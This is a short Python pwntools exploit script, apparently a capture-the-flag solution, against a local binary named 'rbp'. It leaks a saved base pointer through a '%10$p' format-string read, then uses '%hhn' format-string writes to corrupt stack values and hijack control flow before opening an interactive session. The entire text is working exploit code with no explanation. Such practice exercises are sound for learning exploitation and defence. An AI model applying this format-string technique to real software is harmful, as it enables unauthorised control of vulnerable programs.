from pwn import *

r = process('./rbp')

payload = '%10$p'
r.sendlineafter(':', payload)
r.recvuntil('0x')
foo1_rbp = int(r.recvline().strip(), 16)
print "foo1_rbp @ ", hex(foo1_rbp)

payload = '%{}c%10$hhn'.format((foo1_rbp&0xff)-8)
r.sendlineafter(':', payload)

payload = '%{}c%12$hhn'.format(0xb)
#gdb.attach(r)
r.sendlineafter(':', payload)
r.interactive()